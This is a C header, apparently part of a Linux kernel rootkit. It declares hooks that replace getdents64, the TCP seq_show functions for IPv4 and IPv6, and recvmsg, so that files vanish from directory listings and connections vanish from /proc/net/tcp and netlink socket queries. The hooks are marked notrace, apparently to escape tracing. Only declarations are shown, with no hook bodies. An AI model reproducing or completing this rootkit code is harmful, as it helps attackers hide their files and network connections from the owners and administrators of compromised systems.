#ifndef HIDE_H
#define HIDE_H

#include <linux/file.h>
#include <linux/fs.h>
#include <linux/inet.h>
#include <linux/inet_diag.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/ptrace.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/sock_diag.h>
#include <linux/socket.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <net/inet_sock.h>

struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

extern asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
extern asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
extern asmlinkage long (*__orig_tcp6_seq_show)(struct seq_file *seq, void *v);
extern asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs);

asmlinkage int notrace getdents64_hook(const struct pt_regs *regs);
asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v);
asmlinkage long notrace tcp6_seq_show_hook(struct seq_file *seq, void *v);
asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs);

#endif // HIDE_H
